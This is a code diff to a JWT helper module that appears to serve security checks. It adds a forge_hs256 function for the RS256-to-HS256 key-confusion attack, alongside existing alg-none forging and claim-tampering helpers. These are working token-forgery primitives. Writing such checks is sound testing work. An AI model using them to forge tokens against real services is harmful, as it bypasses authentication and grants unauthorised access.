@@ -1,6 +1,8 @@
 """JWT helpers used by the checks."""
 
 import base64
+import hashlib
+import hmac
 import json
 import warnings
 
@@ -21,6 +23,18 @@ def forge_alg_none(claims):
     header = _b64url_encode({"alg": "none", "typ": "JWT"})
     payload = _b64url_encode(claims)
     return f"{header}.{payload}."
+
+
+def forge_hs256(claims, secret):
+    """Sign a token with HS256 over raw secret bytes.
+
+    Done by hand because PyJWT refuses to use an asymmetric key as an HMAC
+    secret, which is the whole trick behind the RS256 to HS256 confusion.
+    """
+    header = _b64url_encode({"alg": "HS256", "typ": "JWT"})
+    payload = _b64url_encode(claims)
+    signature = hmac.new(secret, f"{header}.{payload}".encode(), hashlib.sha256).digest()
+    return f"{header}.{payload}.{base64.urlsafe_b64encode(signature).rstrip(b'=').decode()}"
 
 
 def tamper_claims(token, changes):
